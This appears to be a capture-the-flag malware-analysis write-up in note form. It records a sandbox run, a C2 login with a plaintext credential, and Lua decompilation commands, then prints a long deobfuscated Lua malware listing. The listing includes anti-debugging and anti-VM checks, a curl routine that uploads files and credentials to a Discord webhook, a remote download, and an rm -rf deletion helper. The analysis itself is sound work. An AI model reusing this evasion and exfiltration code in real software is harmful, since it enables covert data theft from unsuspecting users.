...
```plain text
Enter any details to download the booking exe
```
*[image unavailable]*
```plain text
https://app.any.run/tasks/6a604135-a1a7-4e07-a14e-8b58f7ff6bb9
```

```plain text
run with the right sandbox settings 
```
...
```plain text
login to the c2 server with the prometheus creds
"prometheus:PA4tqS5NHFpkQwumsd3D92cb"
```
*[image unavailable]*

```plain text
Exctract with the SID from the log file.
500
This is the Relative Identifier (RID) from the binary SID structure in the provided byte sequence (last subauthority value, decimal). In Windows, RID 500 corresponds to the built-in Administrator account—likely the "right" target ID for privilege escalation or data access in this CTF scenario. The full decoded SID is S-1-5-21-3801804562-4118715378-2025092243-500.
```
...
dd if=script.luac of=script_extracted_fixed.luac bs=1 skip=24356

java -jar unluac_2015_06_13.jar script_extracted_fixed.luac > script.lua

./luadec script_extracted.luac > script.lua

To decode the lua emojis
java -jar unluac.jar script.luac
```

```plain text
--[[
  Set up package paths to look for dependencies (.lua, .dll)
  in the script's directory and a 'deps' subdirectory.
]]
do
...
--[[
  Obfuscation variables and the primary decoding function '__D'.
  __K is the default key/seed.
  The emoji-like strings are likely part of the encoding scheme or used elsewhere.
  __D reverses a custom Base16 (using emoji sequences) and applies XOR if a key is given.
]]
local __K = ""
local __P = true -- Flag indicating whether permutation is enabled for decoding
...
local __E_READA = "\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172" -- Decodes to "*a"
local __U8 = function(a, b, c, d)
  return string.char(a, b, c, d)
end

-- Helper function to get the emoji-like character set used for encoding
local function __T()
  return {
    __U8(240, 159, 140, 186), __U8(240, 159, 140, 180), __U8(240, 159, 140, 138),
    __U8(240, 159, 140, 139), __U8(240, 159, 165, 165), __U8(240, 159, 140, 136),
    __U8(240, 159, 144, 162), __U8(240, 159, 144, 160), __U8(240, 159, 144, 172),
    __U8(240, 159, 144, 139), __U8(240, 159, 144, 154), __U8(240, 159, 144, 179),
    __U8(240, 159, 144, 161), __U8(240, 159, 166, 128), __U8(240, 159, 166, 136),
...
local function __D(t, k)
  local T = __T() -- Get the character set
  ...
  -- Pseudo-random number generator (PRNG) based on seed
  ...
  -- Simple XOR function for 4 bits
  local X = function(a, b)
    local r, p = 0, 1
    for _ = 1, 4 do
      local A = a % 2
      local B = b % 2
      if (A + B) % 2 == 1 then r = r + p end
      a = (a - A) / 2
      b = (b - B) / 2
      p = p * 2
    end
  ...
  if k == nil then k = __K end -- Default key if none provided
  local key_on = k ~= nil and k ~= ""
  local permute = __P == true and key_on -- Use permutation if __P is true and key exists
  local toklen = 4 -- Each encoded character sequence length
  local perm = {} -- Permutation table
  for n = 0, 15 do perm[n] = n end

  if permute then
    -- Generate permutation based on hash of key + "|perm"
  ...
  -- Create the decoding map based on the (potentially permuted) character set
  local dec_map = {}
  for n = 0, 15 do
  ...
  t = (t or ""):gsub("%s+", "") -- Remove whitespace from input string
  local out, n, i, step = {}, #t, 1, toklen * 2 -- Output table, input length, index, step size
  local ks -- XOR key stream function

  if key_on then
    -- Initialize XOR key stream generator if key is provided
    local r = M(S(tostring(k) .. "|xor"))
    function ks()
      local v = r() % 256
      return (v - v % 16) / 16, v % 16 -- Return high and low nibbles for XORing
    end
  end

  -- Decode loop
  while n >= i + step - 1 do
    local a = t:sub(i, i + toklen - 1)         -- Get high nibble sequence
    local b = t:sub(i + toklen, i + step - 1) -- Get low nibble sequence
    local hi, lo = dec_map[a], dec_map[b]      -- Decode sequences to nibbles
    if not hi or not lo then break end         -- Invalid sequence found
    if ks then
      -- Apply XOR if key stream exists
      local kh, kl = ks()
      hi = X(hi, kh)
      lo = X(lo, kl)
    end
    out[#out + 1] = string.char(hi * 16 + lo) -- Combine nibbles and add character to output
    i = i + step -- Move to next pair of sequences
  end
  return table.concat(out) -- Return the final decoded string
end

--[[
  Helper variables and functions
]]
local va = {} -- Main table to hold functions/data
local vb = package.config:sub(1, 1) == "\\" -- Check if running on Windows (path separator check)

-- Convert string to lowercase
local function vc(vd) return (vd or ""):lower() end

-- Split string into lines
local ve = function(vf)
  local vg = {}
  if not vf then return vg end
  for vh in vf:gmatch("([^\r\n]+)") do vg[#vg + 1] = vh end
  return vg
end

-- Execute command and read output (simplified popen)
local function vi(vj)
  local vk, vl = pcall(io.popen, vj)
  if not vk or not vl then return ("") end
  local vm = vl:read(("*a")) -- Read all output
  vl:close()
  return vm or ""
end
...
local function vn(vo)
  local vp = io.open(vo, ("rb"))
  if vp then vp:close(); return true end
  return false
end

-- Find the first existing file from a list
local function vq(vr)
  for vs, vt in ipairs(vr) do if vn(vt) then return vt end end
  return nil
end

-- Get environment variable
local vu = function(vv) return os.getenv(vv) end

-- Get time in milliseconds
local vw = function() return (os.clock() or 0) * 1000 end

-- Append item to table (like table.insert)
local vx = function(vy, vz) vy[#vy + 1] = vz end

-- Configuration for anti-analysis checks
va.fa = { fb = 25, fc = 200000, fd = 2, fe = 1, ff = 2 }

--[[
  Anti-analysis / Anti-debugging Checks
]]

-- Check if debug library is tampered with (metatable check)
local function v0()
  if type(debug) ~= "table" then return false, ("debug lib not found") end
  local v1 = { fg = true, fh = true, fi = true, fj = true, fk = true, fl = true, fm = true, fn = true, fo = true }
  local v2 = debug
  local v3 = pcall(setmetatable, v2, {
    __index = function(v4, v5)
      if v1[v5] then error(("debug lib API disallowed: ") .. v5, 2) end
      return rawget(v2, v5)
    end,
    __newindex = function() error(("debug lib API disallowed modification"), 2) end
  })
  if not v3 or not "table" then end
  return v3 ~= false, ("debug lib metatable protection failed")
end
va.fp = v0

-- Dummy function for hook check
local v6 = function() end

-- Set a debug hook (anti-debugger)
local function v7()
  if type(debug) ~= "table" or not debug.sethook then return false end
  debug.sethook(v6, "cr", 0) -- Set hook for call, return, count
  return true
end
va.fq = v7

-- Get current debug hook (anti-debugger)
local function v8()
  if type(debug) ~= "table" or not debug.gethook then return false, nil, nil end
  local v9, v10, v11 = debug.gethook()
  return v9 ~= nil, v10, v11
end
va.fr = v8

-- Check if the specific dummy hook function is set (anti-debugger)
local function v12()
  if type(debug) ~= "table" or not debug.gethook then return false end
  local v13 = debug.gethook()
  return v13 == v6
end
va.fs = v12

-- Timing check (anti-debugger/VM)
local function v14(v15, v16)
  local v15 = v15 or va.fa.fb -- Default threshold
  local v16 = v16 or va.fa.fc -- Default loop count
  local v17 = vw() -- Start time
  local v18 = 0
  for v19 = 1, v16 do v18 = v18 + v19 end -- Simple busy loop
  local v20 = vw() - v17 -- Elapsed time
  return v15 < v20, v20 -- Return true if time exceeds threshold
end
va.ft = v14

-- Dump function bytecode (used for comparison/integrity check)
local v21 = function(v22)
  local v23, v24 = pcall(string.dump, v22, true) -- Try stripping debug info
  if v23 then return v24 end
  v23, v24 = pcall(string.dump, v22) -- Try without stripping
  return v23 and v24 or nil
end
va.fu = v21

-- Compare function bytecode dump (integrity check)
...
-- List of potentially suspicious modules (anti-analysis)
local v29 = { "ffi", "luasec", "alien", "lanes", ("lpeg") }

-- Check if any suspicious modules are loaded or loadable
local function v30()
  for v31, v32 in ipairs(v29) do
    if package.loaded[v32] then return v32 end -- Check if already loaded
    local v33 = pcall(require, v32) -- Try to load
    if v33 then return v32 end
  end
  return nil
end
va.fw = v30

-- Check for TracerPid in /proc/self/status (Linux anti-debugger)
local function v34()
  local v35 = io.open("/proc/self/status", ("rb"))
  if not v35 then return false end
  local v36 = v35:read(("*a"))
  v35:close()
  local v37 = v36 and v36:match("TracerPid:%s*(%d+)")
  return v37 and tonumber(v37) > 0 or false -- Return true if TracerPid > 0
end
va.fx = v34

-- List of known VM/Sandbox indicators (strings)
local v38 = { "fakenet", "dumbnet", "wireshark", "vmware", "virtualbox", "vbox", "qemu", "xen", "kvm", "microsoft hv", "prl_hypervisor", ("vpc"), "vmmouse", "vm3dgl", "vboxvideo", "vboxguest", "vgauthservice", "vmtoolsd", "vmwareuser", "vmwaretrab", "sandbox", "dbg", "ollydbg", "immunity", "windbg", "x64dbg", "x32dbg", "joebox", "hybrid%-analysis", "qemu%-ga" }

-- Check system info (WMIC on Windows, cat on Linux) for VM indicators
local function v39()
  local v40 = ""
  if vb then -- Windows
    v40 = vi(("wmic csproduct get uuid"))
    if #v40 == 0 then v40 = vi(("wmic path win32_computersystemproduct get uuid")) end
  else -- Linux
    v40 = vi(("cat /sys/class/dmi/id/product_uuid"))
  end
  v40 = vc(v40) -- Convert to lowercase
  for v41, v42 in ipairs(v38) do
    if v40:find(v42, 1, true) then return v42 end -- Found indicator
  end
  return nil
end
va.fy = v39

-- List of known VM/Sandbox related environment variables
local v43 = { "__VMWARE_TOOLBOX_SCRIPT_ERROR_FILE", "__VMWARE_TOOLBOX_SCRIPT_LOG_FILE", "VBOX_INSTALL_PATH", "VBOX_MSI_INSTALL_PATH", "VBOX_USER_HOME", ("windir"), ("PROCESSOR_IDENTIFIER"), ("PROCESSOR_REVISION"), "NUMBER_OF_PROCESSORS", "USERNAME", ("COMPUTERNAME"), ("USERDOMAIN"), "LOGONSERVER", ("SYSTEMROOT"), ("PROGRAMFILES"), ("PROGRAMFILES(X86)"), ("PROGRAMW6432"), ("PROGRAMDATA"), "COMMONPROGRAMFILES", "COMMONPROGRAMFILES(X86)", ("COMMONPROGRAMW6432"), ("PUBLIC"), ("ALLUSERSPROFILE"), ("APPDATA"), "LOCALAPPDATA", ("PSModulePath"), "SystemDrive", "TEMP", "TMP" }

-- Check if any known VM/Sandbox environment variables are set
local function v44()
  for v45, v46 in ipairs(v43) do
    local v47 = vu(v46) -- Get env var value
    if v47 and #v47 > 0 then return v46, v47 end -- Found indicator
  end
  return nil
end
va.fz = v44

-- List of known VM/Sandbox file paths
local v48 = { "drivers\\vmmouse.sys", "drivers\\vmhgfs.sys", "drivers\\vm3dgl.dll", ("drivers\\vboxvideo.sys"), "drivers\\vboxguest.sys", "drivers\\vboxsf.sys", "drivers\\vboxmouse.sys", "drivers\\VBoxGuestAdditions.iso", "drivers\\VBoxGuestAdditions", "drivers\\VBoxGuestAdditions_amd64.exe", ("drivers\\VBoxGuestAdditions_x86.exe"), "drivers\\qemuwga.iso", "drivers\\qemuwga", "drivers\\qxl.sys", "drivers\\qxldd.dll", ("drivers\\xensvc.exe"), "drivers\\xenvd.sys", "drivers\\xennet.sys", "drivers\\xenbus.sys", "drivers\\xenfilt.sys", ("drivers\\balloon.sys"), "drivers\\netkvm.sys", "drivers\\vioinput.sys", "drivers\\vioser.sys", "drivers\\viostor.sys", ("drivers\\prl_mouf.sys"), "drivers\\prl_tg.sys", "drivers\\prl_net.sys", "drivers\\prl_sound.sys", "drivers\\prl_time.sys", ("drivers\\prl_dd.sys"), "drivers\\prl_fs.sys", "drivers\\prl_video.sys", "drivers\\prl_hid_dev", "drivers\\prl_vib", ("drivers\\prl_eth"), "drivers\\prl_parags", "drivers\\prl_v Stor", "drivers\\prl_v Dev", "drivers\\prl_v Bus", ("drivers\\vpcbus.sys"), "drivers\\vpc-s3.sys", "drivers\\vmsrvc.exe", "drivers\\mouse.sys", "drivers\\vmdebug-gdb.dll", ("drivers\\vmware Physical Disk Helper Service.exe"), "system32\\drivers\\vmmouse.sys", "system32\\drivers\\vmhgfs.sys", "system32\\drivers\\vm3dgl.dll", ("system32\\drivers\\vboxvideo.sys"), "system32\\drivers\\vboxguest.sys", "system32\\drivers\\vboxsf.sys", "system32\\drivers\\vboxmouse.sys", ("system32\\drivers\\qemuwga.iso"), "system32\\drivers\\qemuwga", "system32\\drivers\\qxl.sys", "system32\\drivers\\qxldd.dll", ("system32\\drivers\\xensvc.exe"), "system32\\drivers\\xenvd.sys", "system32\\drivers\\xennet.sys", "system32\\drivers\\xenbus.sys", ("system32\\drivers\\xenfilt.sys"), "system32\\drivers\\balloon.sys", "system32\\drivers\\netkvm.sys", "system32\\drivers\\vioinput.sys", ("system32\\drivers\\vioser.sys"), "system32\\drivers\\viostor.sys", "system32\\drivers\\prl_mouf.sys", "system32\\drivers\\prl_tg.sys", ("system32\\drivers\\prl_net.sys"), "system32\\drivers\\prl_sound.sys", "system32\\drivers\\prl_time.sys", "system32\\drivers\\prl_dd.sys", ("system32\\drivers\\prl_fs.sys"), "system32\\drivers\\prl_video.sys", "system32\\drivers\\prl_hid_dev", "system32\\drivers\\prl_vib", ("system32\\drivers\\prl_eth"), "system32\\drivers\\prl_parags", "system32\\drivers\\prl_v Stor", "system32\\drivers\\prl_v Dev", ("system32\\drivers\\prl_v Bus"), "system32\\drivers\\vpcbus.sys", "system32\\drivers\\vpc-s3.sys", "system32\\drivers\\vmsrvc.exe", ("system32\\drivers\\mouse.sys"), "system32\\drivers\\vmdebug-gdb.dll", "system32\\drivers\\vmware Physical Disk Helper Service.exe", "system32\\vboxdisp.dll", ("system32\\vboxhook.dll"), "system32\\vboxmrxnp.dll", "system32\\vboxogl.dll", "system32\\vboxoglarrayspu.dll", ("system32\\vboxoglcrutil.dll"), "system32\\vboxoglerrorspu.dll", "system32\\vboxoglfeedbackspu.dll", "system32\\vboxoglpackspu.dll", ("system32\\vboxoglpassthroughspu.dll"), "system32\\vboxservice.exe", "system32\\vboxtray.exe", "system32\\VBoxControl.exe" }

-- Check if any known VM/Sandbox files exist
local function v49()
  local v50 = {}
  if vb then -- Windows
    local v51 = vc(vi(("wmic path win32_VideoController get Name")))
    local v52 = vc(vi(("wmic path Win32_PNPEntity WHERE \"service like 'VBox%'\" get Name")))
    if #v51 > 0 then vx(v50, v51) end
    if #v52 > 0 then vx(v50, v52) end
  else -- Linux
    for v53, v54 in ipairs({"/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/board_vendor", ("/sys/class/dmi/id/board_name")}) do
      local v55 = io.open(v54, ("rb"))
      if v55 then
        local v56 = v55:read(("*a")) or ""
        v55:close()
        if #v56 > 0 then vx(v50, vc(v56)) end
      end
    end
    local v57 = io.open("/proc/scsi/scsi", ("rb"))
    if not v57 or not v57:read(("*a")) then end
    local v58 = vc((""))
    if v57 then v57:close() end
    if #v58 > 0 then vx(v50, v58) end
  end
  local v59 = table.concat(v50, ("\r\n")) -- Combine results with newline
  for v60, v61 in ipairs(v48) do
    if v59:find(v61) then return v61 end -- Found indicator
  end
  return nil
end
va.f0 = v49

-- Check CPU core count and memory size (anti-VM/sandbox)
local function v62()
  if vb then -- Windows
    local v63 = vq({"C:\\Windows\\System32\\wbem\\WMIC.exe", "C:\\Windows\\SysWow64\\wbem\\WMIC.exe", "C:\\Windows\\System32\\Wbem\\wmic.exe", ("C:\\Windows\\SysWow64\\Wbem\\wmic.exe")})
    if v63 then return v63 end
  else -- Linux
    local v64 = vc(vi(("uname -a")))
    for v65, v66 in ipairs({"/bin/cat", "/usr/bin/cat", "/sbin/cat", ("/usr/sbin/cat")}) do
      if #v64 > 0 and v64:find(v66, 1, true) then return v66 end
    end
    local v67 = vq({"/usr/bin/grep", "/bin/grep", ("/usr/sbin/grep"), "/sbin/grep"})
    if v67 then return v67 end
  end
  return nil
end
va.f1 = v62

-- Check for low CPU cores or memory (anti-VM/sandbox)
local function v68()
  local v69 = vc(vu(vb and "NUMBER_OF_PROCESSORS" or "NUMBER_OF_PROCESSORS") or "")
  local v70 = vc(vu(vb and "PROCESSOR_ARCHITECTURE" or "PROCESSOR_ARCHITECTURE") or "")
  local v71 = {"core", "memory", "intel", "amd", "cpu", "processor", "win%-", ("linux%")} -- Keywords to check against
  for v72, v73 in ipairs(v71) do
    if #v69 > 0 and v69:find(v73) then return "env " .. v73 end
    if #v70 > 0 and v70:find(v73) then return "env " .. v73 end
  end
  return nil
end
va.f2 = v68

-- Further check for low CPU cores or memory via system commands
local function v74()
  local v75 = tonumber(vu(vb and "__PROCESSOR_NUMBER_OF_CORES__" or "PROCESSOR_COUNT") or "") or 0
  local v76 = v75 > 0 and v75 <= 2 -- Check if core count is 2 or less
  local v77 = false -- Memory check flag
  if vb then -- Windows
    local v78 = vi(("wmic cpu get NumberOfCores"))
    local v79 = tonumber(v78:match("TotalVisibleMemorySize=(%d+)") or "")
    if v79 and v79 > 0 then
      local v80 = v79 / 1024 -- Convert KB to MB
      v77 = v80 < 2048 -- Check if memory is less than 2GB
    end
  else -- Linux
    local v81 = io.open("/proc/meminfo", ("rb"))
    if v81 then
      local v82 = v81:read(("*a")) or ""
      v81:close()
      local v83 = tonumber(v82:match("MemTotal:%s*(%d+)"))
      v77 = v83 and v83 / 1024 < 2048 -- Check if memory < 2GB
    end
  end
  return v76 and "low core count" or v77 and "low memory size" or nil
end
va.f3 = v74

-- Check for existence of common VM file paths
local function v84()
  if vb then -- Windows
    local v85 = vq({"C:\\Windows\\System32\\Drivers\\Vmmouse.sys", "C:\\Windows\\System32\\Drivers\\vmhgfs.sys", "C:\\Windows\\System32\\Drivers\\VBoxGuest.sys", ("C:\\Windows\\System32\\Drivers\\VBoxMouse.sys"), "C:\\Windows\\System32\\Drivers\\VBoxSF.sys", ("C:\\Windows\\System32\\Drivers\\VBoxVideo.sys")})
    if v85 then return v85 end
  else -- Linux
    local v85 = vq({"/usr/bin/VBoxClient", "/usr/bin/VBoxControl", "/usr/bin/VBoxService", ("/sbin/mount.vboxsf")})
    if v85 then return v85 end
  end
  return nil
end
...
-- Check if LuaJIT FFI is available
local function v86() return type(jit) == "table" and jit.f5 and true or false end

-- Check for specific Windows FFI function (IsDebuggerPresent)
local function v87()
  local v88, v89 = pcall(require, ("ffi"))
  if not v88 then return false end
  v89.f6("BOOL IsDebuggerPresent(void);") -- C definition
  local v90 = v89.f7(("kernel32"))
  if v90.f8() ~= 0 then return true end -- Check if function resolves
  local v91 = v89.f9("intptr_t", 0) -- Pointer
  v90.f10(v90.f11(), v91) -- Call GetProcAddress equivalent
  return v91[0] ~= 0 -- Check if address is non-null
end

-- Check for specific Linux FFI function (ptrace)
local function v92()
  local v93, v94 = pcall(require, ("ffi"))
  if not v93 then return false end
  v94.f6("long ptrace(int request, int pid, void* addr, void* data);") -- C definition
  local v95 = 0 -- PT_TRACE_ME request
  local v96 = v94.f12.f13(v95, 0, nil, nil) -- Call ptrace
  if v96 == -1 then return true end -- -1 indicates already being traced
  return false
end

-- Check using FFI for IsDebuggerPresent (Windows)
function va.f14()
  if not vb or not v86() then return false end -- Only run on Windows with FFI
  local v97, v98 = pcall(v87)
  return v97 and v98 or false
end

-- Check using FFI for ptrace (Linux)
function va.f15()
  if vb or not v86() then return false end -- Only run on Linux with FFI
  local v99, v100 = pcall(v92)
  return v99 and v100 or false
end

-- Aggregate all anti-analysis checks
function va.f16(v101)
  v101 = v101 or {}
  local v102 = {} -- List of detected indicators
  local v103, v104, v105 = 0, 0, 0 -- Counts for different categories
  local v106 = va.fr() -- Get hook status
  if v106 then v103 = v103 + 1; vx(v102, ("debug hook found")) end
  if not va.fs() then -- If dummy hook not found
    va.fq() -- Try setting dummy hook
    if not va.fs() then -- Still not found?
      v103 = v103 + 1; vx(v102, ("failed to set debug hook"))
    end
  end
  local v107, v108 = va.ft(va.fa.fb, va.fa.fc) -- Timing check
  if v107 then v103 = v103 + 1; vx(v102, ("single_step_slow:%dms"):format(v108)) end
  local v109 = va.fw() -- Check loaded modules
  if v109 then v103 = v103 + 1; vx(v102, ("suspicious module loaded: ") .. v109) end
  if not vb and va.fx() then -- Linux TracerPid check
    v103 = v103 + 1; vx(v102, ("debugger detected via tracerpid"))
  end
  local v110 = va.fz() -- Check suspicious env vars
  if v110 then v103 = v103 + 1; vx(v102, ("suspicious environment variable found: ") .. v110) end
  if vb and va.f14() then -- Windows FFI IsDebuggerPresent check
    v103 = v103 + 1; vx(v102, (("debugger detected via ffi isdebuggerpresent")))
  end
  if not vb and va.f15() then -- Linux FFI ptrace check
    v103 = v103 + 1; vx(v102, (("debugger detected via ffi ptrace")))
  end
  local v111 = va.fy() -- Check VM indicators in system info
  if v111 then v104 = v104 + 1; vx(v102, ("vm indicator found in system info: ") .. v111) end
  local v112 = va.f0() -- Check VM indicators in hardware names
  if v112 then v105 = v105 + 1; vx(v102, ("vm indicator found in hardware name: ") .. v112) end
  local v113 = va.f1() -- Check VM file paths
  if v113 then v105 = v105 + 1; vx(v102, ("vm indicator found in file path: ") .. v113) end
  local v114 = va.f2() -- Check VM indicators in env vars (again?)
  if v114 then v104 = v104 + 1; vx(v102, ("vm indicator found in env var: ") .. v114) end
  local v115 = va.f3() -- Check low core/memory via system commands
  if v115 then v104 = v104 + 1; vx(v102, v115) end
  local v116 = va.f4() -- Check specific VM file paths
  if v116 then v104 = v104 + 1; vx(v102, ("vm indicator found in file path: ") .. v116) end

  local v117 = v103 + v104 + v105 -- Total indicator count
  ...
  return {
    f17 = v118, -- Final detection flag
    f18 = v117, -- Total count
    f19 = v103, -- Debugger/Hook count
    f20 = v104, -- VM/Env count
    f21 = v105, -- VM/File count
    f22 = v102, -- List of indicators found
    f23 = vb and "windows" or "linux" -- OS detected
  }
end

-- Function to handle detection result (e.g., exit, sleep, no-op)
function va.f24(v119)
  v119 = v119 or { f25 = "exit", f26 = 1 } -- Default action: exit with code 1
  local v120 = va.f16(v119.f27 or {}) -- Run checks
  if v120.f17 then -- If detected
    local v121 = v119.f25 or "exit"
    if v121 == "exit" then
      os.exit(v119.f26 or 1) -- Exit
    elseif v121 == "sleep" then
      if vb then vi("timeout /t " .. (v119.f28 or 10) .. " /nobreak > nul") -- Windows sleep
      else vi("sleep " .. (v119.f28 or 10)) end -- Linux sleep
    elseif v121 == "loop" then -- Infinite loop
      while true do end
    elseif v121 == "noop" then -- Do nothing
    end
  end
  return v120 -- Return detection results
end

-- Disable debug library hooks immediately
function va.f29()
  pcall(va.fp) -- Protect debug lib metatable
  pcall(va.fq) -- Set dummy hook
end

--[[
  Main Execution Logic
]]
local v122 = va.f16() -- Run initial checks
if v122.f17 then os.exit() end -- Exit if detected

-- Helper: Quote string for command line
local function qc(s) return '"' .. s:gsub('"', ('\\"')) .. '"' end
-- Helper: Backslash quote (seems unused?)
local function qp(s) return '`' .. s:gsub('`', ('``')) .. '`' end

-- Check if curl exists
local function ht(c)
  local f = io.popen(c .. " --help > nul 2>&1 && echo OK")
  local o = f:read("*a") or ""
  f:close()
  return o:find("OK", 1, true) -- Check if "OK" is in output
end

-- Run command and get output
local function rc(c)
  local f = io.popen(c .. " 2>&1")
  local o = f:read("*a") or ""
  f:close()
  return o
end

-- Upload function using curl (likely broken argument usage)
function uf(fp, u, us, ps)
  local f = io.open(fp, ("rb")) -- Check if file exists
  if not f then return false end
  f:close()
  if not ht(("curl")) then os.exit(); return false, nil, ("curl not found") end -- Check for curl

  local t = 30 -- Timeout
  -- Construct curl command for GET request (seems to just check connectivity?)
  local pc = table.concat({ "curl", "-connect-timeout " .. t, "-m " .. t, "-k", "-w HTTPSTATUS:%{http_code}", qc(u) }, (" "))
  local pr = rc(pc) or ""
  local pb, pcd = pr:match("^(.*)HTTPSTATUS:(%d%d%d)$") -- Extract status code
  if not pcd then os.exit(1) end -- Exit if no status code

  -- Construct curl command for POST (file upload)
  local cmd = table.concat({
    "curl", "-connect-timeout " .. t, "-m " .. t, "-k",
    "-w HTTPSTATUS:%{http_code}",
    "-F " .. qc(us .. "=" .. ps), -- User/Pass as form data
    "-F " .. qc("file=@" .. fp),   -- File upload syntax
    qc(u)                          -- URL
  }, (" "))
  local r = rc(cmd) or ""
  local b, c = r:match("^(.*)HTTPSTATUS:(%d%d%d)$") -- Extract status code
  if c then
    local n = tonumber(c)
    return n and n >= 200 and n < 300, n, b or "" -- Return success based on 2xx status
  end
  return false, nil, r
end

-- Helper: Convert address string to hex number string
local ha = function(s)
...
-- Seed RNG based on table address and time
do
...
-- Join path components using the correct separator
local function jo(a, b)
  local la = a:sub(-1)
  if la == "\\" or la == "/" then return a .. b end
  return a .. "\\" .. b
end

-- Execute command (redundant?)
local function ex(c)
  local r = os.execute(c)
  if type(r) == "boolean" then return r == 0 end
  if type(r) == "number" then return r end
  return false
end

-- Execute delete commands (rmdir/del or rm)
local function ed(d)
  return ex("rmdir /s /q " .. d .. " && del /q " .. d .. " || rm -rf " .. d)
end

-- Quote string (redundant?)
local function q(s) return '"' .. s:gsub('"', ('\\"')) .. '"' end

-- Download file using curl
local function dl(u, o)
  return ex("curl -k -o " .. q(o) .. " " .. q(u))
end
...
-- Generate two random hex strings (8 chars each)
local function rn() return rh(8) .. rh(8) end
...
local tp = os.getenv(("TEMP")) or "/tmp/"
-- Create a unique subdirectory within the temp path
local st = jo(tp, rn())
-- Define the target path for the downloaded/archived file
local ou = jo(st, rn() .. ".rar")
ed(st) -- Ensure the temp subdirectory doesn't exist initially

-- Download flag.txt
if not dl("https://transfer.sh/flag.txt", ou) or not fe(ou) then os.exit(1) end

-- Archive creation/upload (BROKEN LOGIC)
local function bd(z, b, n, p)
  local s = b .. "\\" .. n .. "\\" -- Uses content 'b' (flag.txt content) as part of a path!
  local o = st .. "\\" .. os.getenv(("USERNAME")) .. "-" .. n .. ".rar" -- Archive name uses username
  -- Constructs a 'rar' command, but likely fails because 'z' (ou path) isn't the rar executable
  -- and 's' is probably an invalid path constructed from the flag content.
  local cmd = table.concat({z, "a", "-ep" .. p .. "", q(o), q(s .. "*.r*"), ">", ("nul")}, (" "))
  os.execute(cmd)
  return o
end

local pc = "flag.txt" -- Define filename (used later?)
local h = io.popen(pc, ("rb")) -- Tries to open "flag.txt" as if it were a command? This will likely fail.
if h then
  local o = h:read(("*a*l*n")) -- Read output (likely empty/error)
  h:close()
  local u, cu = {}, nil -- Table 'u' seems intended to hold CPU info, but likely remains empty.
  -- The following loop iterates over the (likely empty/error) output 'o'
  for_each_line(o, function(l)
    -- This block attempts to parse CPU info, but won't run if 'o' is empty.
    if l:sub(1, 4) == "    " then
      local colon = l:find(":", 1, true)
      if colon and u.c then
        local v = trim(l:sub(colon + 1))
        u.c.s = v -- Store value?
        local f = st .. "\\" .. os.getenv(("USERNAME")) .. "-" .. u.c.n .. ".txt" -- Construct a .txt path
        local pc2 = "echo " .. u.c.s .. " > " .. f .. "" -- Command to write value to .txt file
        os.execute(pc2)
        uf(f, "https://discord.com/api/webhooks/11111111111111111/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "username", "password") -- Attempts to upload the .txt file
        o = bd(ou, "flag.txt", u.c.n, u.c.s) -- Calls the broken archive function again
        uf(o, "https://discord.com/api/webhooks/11111111111111111/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "username", "password") -- Attempts to upload the .rar file
      end
    else
      local colon = l:find(":", 1, true)
      if colon then
  ...
  u.c = nil -- Clear temp value
end
```

run this to get the decoded checkes
*[image unavailable]*
